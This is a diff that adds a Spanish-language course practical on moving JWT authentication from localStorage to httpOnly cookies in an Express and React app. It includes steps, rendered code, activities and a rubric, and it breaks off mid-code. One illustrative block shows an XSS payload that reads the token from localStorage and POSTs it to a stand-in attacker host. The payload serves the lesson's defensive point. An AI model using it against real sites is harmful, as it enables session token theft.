+      <li>Modificar el endpoint de login para que envíe el JWT en una cookie httpOnly en lugar del body JSON.</li>
+      <li>Crear el endpoint de logout que borra la cookie del servidor.</li>
+      <li>Actualizar el middleware para leer el token desde la cookie en lugar del header Authorization.</li>
+      <li>Configurar CORS en el backend para aceptar peticiones con credenciales desde el frontend.</li>
+      <li>Crear el <code>AuthContext.jsx</code> que gestiona el estado de sesión sin tocar localStorage.</li>
+      <li>Crear <code>LoginPage.jsx</code> con formulario de acceso.</li>
+      <li>Crear <code>PrivateRoute.jsx</code> que protege rutas redirigiendo al login.</li>
+      <li>Configurar axios con <code>withCredentials: true</code> para que envíe la cookie en cada petición.</li>
+    </ul>
+  </div>
+
+  <!-- 4. ESTRUCTURA -->
+  <div class="seccion" id="estructura">
+    <div class="seccion-titulo"><span class="seccion-num">4</span> Cambios en backend y frontend</div>
+
+    <div class="subseccion-titulo">Backend — archivos que cambian</div>
+    <div class="folder-tree">
+      <span class="d">backend/</span><br>
+      ├── <span class="f-modif">server.js</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← agregar cookie-parser + CORS con credentials</span><br>
+      ├── <span class="f-modif">controllers/auth.controller.js</span>&nbsp;&nbsp;&nbsp;<span class="cm">← login usa res.cookie(), agregar logout</span><br>
+      ├── <span class="f-modif">routes/auth.routes.js</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← agregar ruta POST /logout</span><br>
+      └── <span class="f-modif">middlewares/auth.middleware.js</span>&nbsp;&nbsp;&nbsp;<span class="cm">← leer token de req.cookies en lugar de header</span>
+    </div>
+
+    <div class="subseccion-titulo">Frontend — archivos nuevos y modificados</div>
+    <div class="folder-tree">
+      <span class="d">frontend/src/</span><br>
+      ├── <span class="f-modif">main.jsx</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← envolver con AuthProvider</span><br>
+      ├── <span class="f-modif">App.jsx</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← ruta /login pública + PrivateRoute en privadas</span><br>
+      ├── <span class="d">context/</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← carpeta NUEVA</span><br>
+      │&nbsp;&nbsp;&nbsp;└── <span class="f-nuevo">AuthContext.jsx</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← estado global sin localStorage</span><br>
+      ├── <span class="d">pages/</span><br>
+      │&nbsp;&nbsp;&nbsp;└── <span class="f-nuevo">LoginPage.jsx</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← pantalla de inicio de sesión</span><br>
+      ├── <span class="d">components/</span><br>
+      │&nbsp;&nbsp;&nbsp;├── <span class="f-nuevo">PrivateRoute.jsx</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← guarda rutas privadas</span><br>
+      │&nbsp;&nbsp;&nbsp;└── <span class="f-modif">Navbar.jsx</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← mostrar usuario + botón logout</span><br>
+      └── <span class="d">api/</span><br>
+      &nbsp;&nbsp;&nbsp;&nbsp;├── <span class="f-nuevo">auth.api.js</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← login y logout con withCredentials</span><br>
+      &nbsp;&nbsp;&nbsp;&nbsp;└── <span class="f-modif">personas.api.js</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm">← agregar withCredentials: true a axios</span>
+    </div>
+  </div>
+
+  <!-- 5. DESARROLLO -->
+  <div class="seccion" id="desarrollo">
+    <div class="seccion-titulo"><span class="seccion-num">5</span> Desarrollo paso a paso</div>
+
+    <!-- PASO 0 — PREREQUISITO -->
+    <div class="paso" style="border-color:#E65100;">
+      <div class="paso-header">
+        <span class="paso-num" style="background:#E65100;">Paso 0</span>
+        <span class="paso-titulo">Prerequisito — crear el primer usuario con Thunder Client</span>
+      </div>
+      <p>Antes de implementar el login en React necesitas tener al menos un usuario en la tabla <code>usuarios</code>. Esa tabla nace vacía — el archivo <code>database.sql</code> solo insertó personas, proyectos y tareas, pero ningún usuario de acceso.</p>
+      <p>El usuario <strong>debe estar vinculado a una persona existente</strong> en la tabla <code>personas</code>. Los registros semilla disponibles son:</p>
+
+      <table class="tabla-gen" style="margin-bottom:14px;">
+        <thead><tr><th>id</th><th>Nombre</th><th>Puesto</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Ana García López</td><td>Coordinadora</td></tr>
+          <tr><td>2</td><td>Luis Martínez Ruiz</td><td>Desarrollador</td></tr>
+          <tr><td>3</td><td>María Torres Vega</td><td>Diseñadora</td></tr>
+          <tr><td>4</td><td>Carlos Mendoza</td><td>Contador</td></tr>
+          <tr><td>5</td><td>Sofía Reyes Díaz</td><td>Administradora</td></tr>
+        </tbody>
+      </table>
+
+      <p>Asegúrate de que el backend esté corriendo (<code>npm run dev</code> en la carpeta <code>backend/</code>). Luego en Thunder Client crea la siguiente petición:</p>
+
+      <div class="file-label">Thunder Client — POST http://localhost:3000/api/auth/registro — Body JSON</div>
+      <div class="code-wrap"><canvas id="c_paso0_registro"></canvas></div>
+
+      <div class="info"><strong>✅ Respuesta esperada:</strong> código <code>201</code> con el mensaje "Usuario registrado correctamente". Verifica en phpMyAdmin que la columna <code>password_hash</code> contiene el hash de bcrypt — empieza con <code>$2b$10$</code> y no la contraseña en texto plano.</div>
+
+      <p style="margin-top:12px;">Prueba también que el login funciona desde Thunder Client antes de continuar con el frontend:</p>
+
+      <div class="file-label">Thunder Client — POST http://localhost:3000/api/auth/login — Body JSON</div>
+      <div class="code-wrap"><canvas id="c_paso0_login"></canvas></div>
+
+      <div class="info"><strong>✅ Respuesta esperada:</strong> código <code>200</code> con el mensaje "Login exitoso" y los datos del usuario. A partir de aquí el navegador ya maneja la cookie — <strong>no necesitas copiar ningún token</strong>, eso es precisamente la mejora de P07 respecto a P06.</div>
+
+      <div class="seguridad">
+        <strong>🔐 ¿Por qué no hay usuario de prueba en el SQL?</strong> Porque para guardar una contraseña en la BD primero hay que hashearla con bcrypt — y eso requiere que el backend esté corriendo. No es posible poner la contraseña directamente en el INSERT del SQL (sería texto plano). Por eso el primer usuario siempre se crea llamando al endpoint de registro.
+      </div>
+    </div>
+
+    <!-- PASO 1 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 1</span><span class="paso-titulo">Instalar <code>cookie-parser</code> en el backend</span></div>
+      <p><code>cookie-parser</code> es el middleware de Express que permite leer las cookies que llegan en cada petición. Sin él, <code>req.cookies</code> estaría vacío.</p>
+      <div class="file-label">Terminal — dentro de backend/</div>
+      <div class="code-wrap"><canvas id="c_install"></canvas></div>
+    </div>
+
+    <!-- PASO 2 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 2</span><span class="paso-titulo">Actualizar <code>server.js</code> — cookie-parser y CORS con credenciales</span></div>
+      <p>Dos cambios importantes: activar <code>cookie-parser</code> y configurar CORS para aceptar peticiones con cookies desde el frontend. Con cookies <strong>no puedes usar <code>origin: '*'</code></strong> — debes especificar el origen exacto del frontend.</p>
+      <div class="file-label modif">server.js — reemplazar contenido completo</div>
+      <div class="code-wrap modif"><canvas id="c_server"></canvas></div>
+      <div class="peligro">
+        <strong>⚠️ Con cookies NO puedes usar <code>origin: '*'</code>.</strong> El navegador rechaza peticiones con credenciales cuando el servidor responde con <code>Access-Control-Allow-Origin: *</code>. Debes poner el origen exacto del frontend: <code>'http://localhost:5173'</code>.
+      </div>
+    </div>
+
+    <!-- PASO 3 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 3</span><span class="paso-titulo">Actualizar <code>auth.controller.js</code> — login con cookie y función logout</span></div>
+      <p>El login ya no devuelve el token en el JSON — ahora lo <strong>escribe directamente como cookie httpOnly</strong> en la respuesta. Se agrega también la función <code>logout</code> que borra esa cookie:</p>
+      <div class="file-label modif">controllers/auth.controller.js — reemplazar contenido completo</div>
+      <div class="code-wrap modif"><canvas id="c_auth_ctrl"></canvas></div>
+      <div class="profesional">
+        <strong>💡 ¿Por qué el login ya no devuelve el token en el JSON?</strong> Porque si lo devolviera, el frontend podría guardarlo en JavaScript y volvería al problema de localStorage. Al ponerlo solo en la cookie httpOnly, el token nunca pasa por JavaScript del frontend — el navegador lo recibe, lo guarda y lo envía automáticamente sin que ningún script lo pueda interceptar.
+      </div>
+    </div>
+
+    <!-- PASO 4 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 4</span><span class="paso-titulo">Actualizar <code>auth.routes.js</code> — agregar ruta de logout</span></div>
+      <div class="file-label modif">routes/auth.routes.js — modificar</div>
+      <div class="code-wrap modif"><canvas id="c_auth_routes"></canvas></div>
+    </div>
+
+    <!-- PASO 5 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 5</span><span class="paso-titulo">Actualizar el middleware — leer token desde la cookie</span></div>
+      <p>El middleware ya no busca el header <code>Authorization</code> — ahora lee el token directamente de <code>req.cookies.token</code>, que <code>cookie-parser</code> ya procesó antes de que llegue al middleware:</p>
+      <div class="file-label modif">middlewares/auth.middleware.js — reemplazar contenido completo</div>
+      <div class="code-wrap modif"><canvas id="c_middleware"></canvas></div>
+    </div>
+
+    <!-- PASO 6 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 6</span><span class="paso-titulo">Crear <code>auth.api.js</code> en el frontend — con <code>withCredentials</code></span></div>
+      <p>Crea la carpeta <code>src/api/</code> si no existe. El parámetro <code>withCredentials: true</code> le dice a axios que incluya las cookies en las peticiones cross-origin. Sin esto la cookie nunca llegaría al backend:</p>
+      <div class="file-label nuevo">src/api/auth.api.js — archivo nuevo</div>
+      <div class="code-wrap nuevo"><canvas id="c_auth_api"></canvas></div>
+    </div>
+
+    <!-- PASO 7 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 7</span><span class="paso-titulo">Actualizar <code>personas.api.js</code> — agregar <code>withCredentials</code></span></div>
+      <p>Todas las peticiones a rutas protegidas también necesitan enviar la cookie. La forma más limpia es configurar una instancia base de axios con <code>withCredentials: true</code> y usarla en todo el módulo:</p>
+      <div class="file-label modif">src/api/personas.api.js — reemplazar contenido completo</div>
+      <div class="code-wrap modif"><canvas id="c_personas_api"></canvas></div>
+    </div>
+
+    <!-- PASO 8 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 8</span><span class="paso-titulo">Crear <code>AuthContext.jsx</code> — sin localStorage</span></div>
+      <p>Crea la carpeta <code>src/context/</code> y dentro el archivo. La diferencia clave con el enfoque de localStorage: el estado <code>usuario</code> solo vive en memoria de React. La persistencia real la maneja la cookie del navegador. Al recargar, se hace una petición al backend para verificar si la cookie sigue siendo válida:</p>
+      <div class="file-label nuevo">src/context/AuthContext.jsx — archivo nuevo</div>
+      <div class="code-wrap nuevo"><canvas id="c_auth_ctx"></canvas></div>
+      <ul class="obj-lista" style="margin-top:12px;">
+        <li><strong>Al iniciar la app</strong> — <code>useEffect</code> llama a <code>GET /api/auth/me</code>. Si la cookie existe y es válida, el backend responde con los datos del usuario y se restaura la sesión. Si no hay cookie o expiró, el estado queda en <code>null</code> y PrivateRoute redirigirá al login.</li>
+        <li><strong>login</strong> — llama al backend, que crea la cookie. Guarda los datos del usuario en estado.</li>
+        <li><strong>logout</strong> — llama a <code>POST /api/auth/logout</code> para que el backend borre la cookie. Limpia el estado.</li>
+      </ul>
+      <div class="nota">
+        <strong>¿Por qué necesitamos el endpoint <code>/api/auth/me</code>?</strong> Porque al recargar la página React pierde todo su estado — no sabe si hay sesión. La cookie sigue ahí en el navegador, pero React no puede leerla (eso es precisamente lo que la hace segura). Para restaurar la sesión, le pregunta al backend: "¿esta cookie que te envío es válida? Si sí, dime quién es el usuario."
+      </div>
+    </div>
+
+    <!-- PASO 9 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 9</span><span class="paso-titulo">Agregar el endpoint <code>/api/auth/me</code> al backend</span></div>
+      <p>Este endpoint verifica la cookie y devuelve los datos del usuario. Se protege con el middleware de autenticación que ya creaste:</p>
+      <div class="file-label modif">controllers/auth.controller.js — agregar función <code>me</code> al final</div>
+      <div class="code-wrap modif"><canvas id="c_me"></canvas></div>
+      <div class="file-label modif">routes/auth.routes.js — agregar la ruta /me</div>
+      <div class="code-wrap modif"><canvas id="c_auth_routes2"></canvas></div>
+    </div>
+
+    <!-- PASO 10 -->
+    <div class="paso">
+      <div class="paso-header"><span class="paso-num">Paso 10</span><span class="paso-titulo">Crear <code>LoginPage.jsx</code>, <code>PrivateRoute.jsx</code> y actualizar <code>Navbar.jsx</code>, <code>main.jsx</code> y <code>App.jsx</code></span></div>
+
+      <div class="file-label nuevo">src/pages/LoginPage.jsx — archivo nuevo</div>
+      <div class="code-wrap nuevo"><canvas id="c_login_page"></canvas></div>
+
+      <div class="file-label nuevo">src/components/PrivateRoute.jsx — archivo nuevo</div>
+      <div class="code-wrap nuevo"><canvas id="c_private_route"></canvas></div>
+
+      <div class="file-label modif">src/components/Navbar.jsx — reemplazar</div>
+      <div class="code-wrap modif"><canvas id="c_navbar"></canvas></div>
+
+      <div class="file-label modif">src/main.jsx — agregar AuthProvider</div>
+      <div class="code-wrap modif"><canvas id="c_main"></canvas></div>
+
+      <div class="file-label modif">src/App.jsx — reemplazar contenido completo</div>
+      <div class="code-wrap modif"><canvas id="c_app"></canvas></div>
+
+      <div class="info">
+        <strong>✅ Verificación:</strong> Abre <code>localhost:5173</code>. Debe redirigir a <code>/login</code>. Ingresa las credenciales que creaste en P06. Si el login es exitoso redirige a <code>/personas</code> y la tabla carga correctamente. Verifica en DevTools → Application → Cookies que existe una cookie llamada <code>token</code> marcada como <code>HttpOnly</code>. Al hacer logout la cookie desaparece.
+      </div>
+    </div>
+  </div>
+
+  <!-- 6. ACTIVIDADES -->
+  <div class="seccion" id="actividades">
+    <div class="seccion-titulo"><span class="seccion-num">6</span> Actividades</div>
+    <table class="actividades">
+      <thead><tr><th>Núm.</th><th>Actividad</th><th>Tipo</th></tr></thead>
+      <tbody>
+        <tr><td>A1</td><td>Abre DevTools → Application → Cookies → <code>localhost:5173</code>. Haz login y toma captura mostrando la cookie <code>token</code> con el atributo <code>HttpOnly</code> marcado. Intenta leer la cookie con <code>document.cookie</code> en la consola. ¿Qué obtienes?</td><td><span class="tipo-badge tipo-prueba">Prueba</span></td></tr>
+        <tr><td>A2</td><td>Prueba el flujo completo: acceder sin sesión (redirige al login), login exitoso, recargar la página (sesión persiste), logout. Toma capturas de cada estado.</td><td><span class="tipo-badge tipo-prueba">Prueba</span></td></tr>
+        <tr><td>A3</td><td>Abre DevTools → Network. Haz login y localiza la petición a <code>/api/auth/login</code>. En la respuesta busca el header <code>Set-Cookie</code>. ¿Qué atributos tiene la cookie? Toma captura.</td><td><span class="tipo-badge tipo-prueba">Prueba</span></td></tr>
+        <tr><td>A4</td><td>Verifica en Network que la petición a <code>/api/personas</code> incluye la cookie automáticamente (sin que tú escribas ningún header en el código). Compara con cómo funcionaba el header <code>Authorization</code> en P06.</td><td><span class="tipo-badge tipo-prueba">Prueba</span></td></tr>
+        <tr><td>A5</td><td>Agrega al formulario de login un botón de "mostrar/ocultar contraseña" que alterne entre <code>type="password"</code> y <code>type="text"</code> usando estado de React.</td><td><span class="tipo-badge tipo-codigo">Código</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- 7. REFLEXIÓN -->
+  <div class="seccion" id="reflexion">
+    <div class="seccion-titulo"><span class="seccion-num">7</span> Preguntas de reflexión</div>
+    <ol class="reflexion-lista">
+      <li>¿Por qué una cookie httpOnly es más segura que localStorage para guardar el JWT? Menciona el ataque específico que previene y cómo lo hace.</li>
+      <li>Con cookies, el token nunca pasa por código JavaScript del frontend. ¿Cómo sabe entonces React si hay sesión activa o no al recargar la página?</li>
+      <li>¿Por qué no puedes usar <code>origin: '*'</code> en CORS cuando el frontend envía cookies? ¿Qué error produce el navegador si lo intentas?</li>
+      <li>¿Qué hace el atributo <code>sameSite: 'strict'</code> en la cookie? ¿Contra qué tipo de ataque protege?</li>
+      <li>Compara el flujo de autenticación con localStorage vs cookies httpOnly. ¿En qué pasos el código del frontend es más simple con cookies? ¿En qué pasos es más complejo?</li>
+    </ol>
+  </div>
+
+  <!-- 8. ENTREGABLE -->
+  <div class="seccion" id="entregable">
+    <div class="seccion-titulo"><span class="seccion-num">8</span> Entregable</div>
+    <ul class="entregable-lista">
+      <li>Carpetas <code>backend/</code> y <code>frontend/</code> comprimidas en ZIP, sin <code>node_modules/</code> y sin el archivo <code>.env</code>.</li>
+      <li>Captura de DevTools Cookies mostrando la cookie <code>token</code> con el atributo HttpOnly (A1) y resultado de <code>document.cookie</code> en consola.</li>
+      <li>Capturas del flujo completo: sin sesión → login → recarga → logout (A2).</li>
+      <li>Captura del header <code>Set-Cookie</code> en la respuesta del login (A3).</li>
+      <li>Captura de la petición a <code>/api/personas</code> mostrando la cookie enviada automáticamente (A4).</li>
+      <li>Código de A5 con mostrar/ocultar contraseña implementado.</li>
+      <li>Respuestas a las 5 preguntas de reflexión.</li>
+    </ul>
+    <div class="peligro"><strong>⚠️ No incluyas <code>.env</code> ni <code>node_modules/</code></strong> en el ZIP.</div>
+  </div>
+
+  <!-- 9. RÚBRICA -->
+  <div class="seccion" id="rubrica">
+    <div class="seccion-titulo"><span class="seccion-num">9</span> Criterios de evaluación</div>
+    <table class="rubrica">
+      <thead><tr><th>Criterio</th><th>Descripción</th><th>Puntos</th></tr></thead>
+      <tbody>
+        <tr><td>Cookie httpOnly en login</td><td>El backend crea la cookie con <code>httpOnly: true</code> y <code>sameSite</code>. No hay token en el JSON de respuesta. Verificado en DevTools.</td><td class="pts">25</td></tr>
+        <tr><td>Middleware lee cookie</td><td>El middleware lee <code>req.cookies.token</code>. Las rutas protegidas funcionan correctamente con la cookie.</td><td class="pts">15</td></tr>
+        <tr><td>AuthContext sin localStorage</td><td>El contexto restaura la sesión llamando a <code>/api/auth/me</code>. No hay referencias a localStorage en el código.</td><td class="pts">20</td></tr>
+        <tr><td>LoginPage y PrivateRoute</td><td>Rutas privadas redirigen al login sin sesión. Login exitoso redirige a <code>/personas</code>.</td><td class="pts">20</td></tr>
+        <tr><td>withCredentials en axios</td><td>Las peticiones al backend incluyen la cookie automáticamente. Verificado en DevTools Network.</td><td class="pts">10</td></tr>
+        <tr><td>Actividades A1–A5</td><td>Capturas requeridas y código de mostrar/ocultar contraseña implementados.</td><td class="pts">10</td></tr>
+      </tbody>
+      <tr class="total"><td colspan="2">Total</td><td>100</td></tr>
+    </table>
+  </div>
+
+</div>
+
+<div class="footer">
+  Ingeniería de Desarrollo y Gestión de Software &nbsp;·&nbsp; Práctica 7 de 13 &nbsp;·&nbsp; Fase 3: Autenticación — cierre
+</div>
+
+<script>
+const KW='#7B40F2', ST='#C0392B', CM='#27AE60', FN='#16A085', PL='#1a1a2e', IM='#8E44AD', NM='#E67E22';
+const FONT='15px "Courier New", monospace';
+const LH=24, PX=18, PY=14;
+
+function draw(id,lines){
+  const cv=document.getElementById(id); if(!cv)return;
+  const dpr=window.devicePixelRatio||1;
+  const tmp=document.createElement('canvas'); const tc=tmp.getContext('2d'); tc.font=FONT;
+  let maxW=0;
+  lines.forEach(l=>{const w=tc.measureText(l.map(s=>s[1]).join('')).width;if(w>maxW)maxW=w;});
+  const W=Math.ceil(maxW+PX*2), H=lines.length*LH+PY*2;
+  cv.width=W*dpr; cv.height=H*dpr; cv.style.width=W+'px'; cv.style.height=H+'px';
+  const ctx=cv.getContext('2d'); ctx.scale(dpr,dpr);
+  ctx.fillStyle='#ffffff'; ctx.fillRect(0,0,W,H);
+  ctx.font=FONT; ctx.textBaseline='alphabetic';
+  lines.forEach((segs,i)=>{
+    const y=PY+i*LH+LH*0.75; let x=PX;
+    segs.forEach(([color,text])=>{ctx.fillStyle=color;ctx.fillText(text,x,y);x+=tc.measureText(text).width;});
+  });
+}
+
+const B={
+
+c_paso0_registro:[
+  [[CM,'// Body → JSON']],
+  [[PL,'{']],
+  [[PL,'  '],[ST,'"persona_id"'],[PL,' : 1,'],[CM,'  ← id de Ana García (ya existe en la BD)']],
+  [[PL,'  '],[ST,'"usuario"'],[PL,'    : '],[ST,'"admin"'],[PL,',']],
+  [[PL,'  '],[ST,'"password"'],[PL,'   : '],[ST,'"admin123"'],[PL,',']],
+  [[PL,'  '],[ST,'"rol"'],[PL,'        : '],[ST,'"admin"']],
+  [[PL,'}']],
+  [[PL,'']],
+  [[CM,'// Respuesta esperada:']],
+  [[PL,'{ '],[ST,'"mensaje"'],[PL,': '],[ST,'"Usuario registrado correctamente"'],[PL,' }']],
+],
+
+c_paso0_login:[
+  [[CM,'// Body → JSON']],
+  [[PL,'{']],
+  [[PL,'  '],[ST,'"usuario"'],[PL,'  : '],[ST,'"admin"'],[PL,',']],
+  [[PL,'  '],[ST,'"password"'],[PL,' : '],[ST,'"admin123"']],
+  [[PL,'}']],
+  [[PL,'']],
+  [[CM,'// Respuesta esperada — ya NO hay token en el JSON:']],
+  [[PL,'{']],
+  [[PL,'  '],[ST,'"mensaje"'],[PL,' : '],[ST,'"Login exitoso"'],[PL,',']],
+  [[PL,'  '],[ST,'"usuario"'],[PL,' : { '],[ST,'"id"'],[PL,': 1, '],[ST,'"usuario"'],[PL,': '],[ST,'"admin"'],[PL,', '],[ST,'"rol"'],[PL,': '],[ST,'"admin"'],[PL,' }']],
+  [[PL,'}']],
+],
+
+c_xss:[
+  [[CM,'// Ataque XSS — el atacante inyecta este script en la página']],
+  [[CM,'// Con localStorage, esto roba el token en una sola línea:']],
+  [[KW,'const'],[PL,' tokenRobado = localStorage.'],[FN,'getItem'],[PL,'('],[ST,"'token'"],[PL,');']],
+  [[FN,'fetch'],[PL,'('],[ST,"'https://sitio-atacante.com/robar'"],[PL,', { method: '],[ST,"'POST'"],[PL,', body: tokenRobado });']],
+  [[PL,'']],
+  [[CM,'// Con cookie httpOnly esto devuelve cadena vacía — la cookie es invisible:']],
+  [[PL,'console.'],[FN,'log'],[PL,'(document.cookie);'],[CM,'  → ""  (el atacante no puede leerla)']],
+],
+
+c_install:[
+  [[CM,'# Dentro de la carpeta backend/']],
+  [[PL,'npm install cookie-parser']],
+],
+
+c_server:[
+  [[IM,'import'],[PL,' express      '],[IM,'from'],[PL,' '],[ST,"'express'"],[PL,';']],
+  [[IM,'import'],[PL,' cors         '],[IM,'from'],[PL,' '],[ST,"'cors'"],[PL,';']],
+  [[IM,'import'],[PL,' cookieParser '],[IM,'from'],[PL,' '],[ST,"'cookie-parser'"],[PL,';'],[CM,'  ← agregar']],
+  [[IM,'import'],[PL,' dotenv       '],[IM,'from'],[PL,' '],[ST,"'dotenv'"],[PL,';']],
+  [[IM,'import'],[PL,' personasRoutes '],[IM,'from'],[PL,' '],[ST,"'./routes/personas.routes.js'"],[PL,';']],
+  [[IM,'import'],[PL,' authRoutes     '],[IM,'from'],[PL,' '],[ST,"'./routes/auth.routes.js'"],[PL,';']],
+  [[IM,'import'],[PL,' { verificarToken } '],[IM,'from'],[PL,' '],[ST,"'./middlewares/auth.middleware.js'"],[PL,';']],
+  [[PL,'']],
+  [[PL,'dotenv.'],[FN,'config'],[PL,'();']],
+  [[KW,'const'],[PL,' app = '],[FN,'express'],[PL,'();']],
+  [[PL,'']],
+  [[CM,'// CORS con credentials: true — obligatorio para cookies cross-origin']],
+  [[CM,'// No puede usarse origin:"*" cuando se envían cookies']],
+  [[PL,'app.'],[FN,'use'],[PL,'('],[FN,'cors'],[PL,'({']],
+  [[PL,'  origin:      '],[ST,"'http://localhost:5173'"],[PL,','],[CM,'  ← origen exacto del frontend']],
+  [[PL,'  credentials: '],[KW,'true'],[PL,','],[CM,'                ← permite envío de cookies']],
+  [[PL,'}));']],
+  [[PL,'']],
+  [[PL,'app.'],[FN,'use'],[PL,'(express.'],[FN,'json'],[PL,'());']],
+  [[PL,'app.'],[FN,'use'],[PL,'('],[FN,'cookieParser'],[PL,'());'],[CM,'  ← parsea las cookies de cada petición']],
+  [[PL,'']],
+  [[PL,'app.'],[FN,'get'],[PL,'('],[ST,"'/api/health'"],[PL,', (req, res) => res.'],[FN,'json'],[PL,'({ status: '],[ST,"'ok'"],[PL,' }));']],
+  [[PL,'app.'],[FN,'use'],[PL,'('],[ST,"'/api/auth'"],[PL,',                 authRoutes);']],
+  [[PL,'app.'],[FN,'use'],[PL,'('],[ST,"'/api/personas'"],[PL,', verificarToken, personasRoutes);']],
+  [[PL,'']],
+  [[KW,'const'],[PL,' PORT = process.env.PORT || 3000;']],
+  [[PL,'app.'],[FN,'listen'],[PL,'(PORT, () => console.'],[FN,'log'],[PL,'(`Servidor en http://localhost:${PORT}`));']],
+],
+
+c_auth_ctrl:[
+  [[IM,'import'],[PL,' bcrypt '],[IM,'from'],[PL,' '],[ST,"'bcrypt'"],[PL,';']],
+  [[IM,'import'],[PL,' jwt    '],[IM,'from'],[PL,' '],[ST,"'jsonwebtoken'"],[PL,';']],
+  [[IM,'import'],[PL,' pool   '],[IM,'from'],[PL,' '],[ST,"'../db.js'"],[PL,';']],
+  [[PL,'']],
+  [[CM,'// ── POST /api/auth/registro ─────────────────────────────────']],
+  [[KW,'export const'],[PL,' registro = '],[KW,'async'],[PL,' (req, res) => {']],
+  [[PL,'  '],[KW,'try'],[PL,' {']],
+  [[PL,'    '],[KW,'const'],[PL,' { persona_id, usuario, password, rol } = req.body;']],
+  [[PL,'    '],[KW,'const'],[PL,' password_hash = '],[KW,'await'],[PL,' bcrypt.'],[FN,'hash'],[PL,'(password, 10);']],
+  [[PL,'    '],[KW,'await'],[PL,' pool.'],[FN,'query'],[PL,'(']],
+  [[PL,'      '],[ST,"'INSERT INTO usuarios (persona_id, usuario, password_hash, rol) VALUES (?,?,?,?)'"],[PL,',']],
+  [[PL,'      [persona_id, usuario, password_hash, rol || '],[ST,"'usuario'"],[PL,']']],
+  [[PL,'    );']],
+  [[PL,'    res.'],[FN,'status'],[PL,'(201).'],[FN,'json'],[PL,'({ mensaje: '],[ST,"'Usuario registrado correctamente'"],[PL,' });']],
+  [[PL,'  } '],[KW,'catch'],[PL,' (err) {']],
+  [[PL,'    '],[KW,'if'],[PL,' (err.code === '],[ST,"'ER_DUP_ENTRY'"],[PL,')']],
+  [[PL,'      '],[KW,'return'],[PL,' res.'],[FN,'status'],[PL,'(400).'],[FN,'json'],[PL,'({ error: '],[ST,"'El usuario ya existe'"],[PL,' });']],
+  [[PL,'    res.'],[FN,'status'],[PL,'(500).'],[FN,'json'],[PL,'({ error: err.message });']],
+  [[PL,'  }']],
+  [[PL,'};']],
+  [[PL,'']],
+  [[CM,'// ── POST /api/auth/login — crea la cookie httpOnly ──────────']],
+  [[KW,'export const'],[PL,' login = '],[KW,'async'],[PL,' (req, res) => {']],
+  [[PL,'  '],[KW,'try'],[PL,' {']],
+  [[PL,'    '],[KW,'const'],[PL,' { usuario, password } = req.body;']],
+  [[PL,'    '],[KW,'const'],[PL,' [rows] = '],[KW,'await'],[PL,' pool.'],[FN,'query'],[PL,'(']],
+  [[PL,'      '],[ST,"'SELECT * FROM usuarios WHERE usuario = ? AND activo = 1'"],[PL,', [usuario]']],
+  [[PL,'    );']],
+  [[PL,'    '],[KW,'if'],[PL,' (rows.length === 0)']],
+  [[PL,'      '],[KW,'return'],[PL,' res.'],[FN,'status'],[PL,'(401).'],[FN,'json'],[PL,'({ error: '],[ST,"'Credenciales incorrectas'"],[PL,' });']],
+  [[PL,'    '],[KW,'const'],[PL,' u = rows[0];']],
+  [[PL,'    '],[KW,'const'],[PL,' ok = '],[KW,'await'],[PL,' bcrypt.'],[FN,'compare'],[PL,'(password, u.password_hash);']],
+  [[PL,'    '],[KW,'if'],[PL,' (!ok)']],
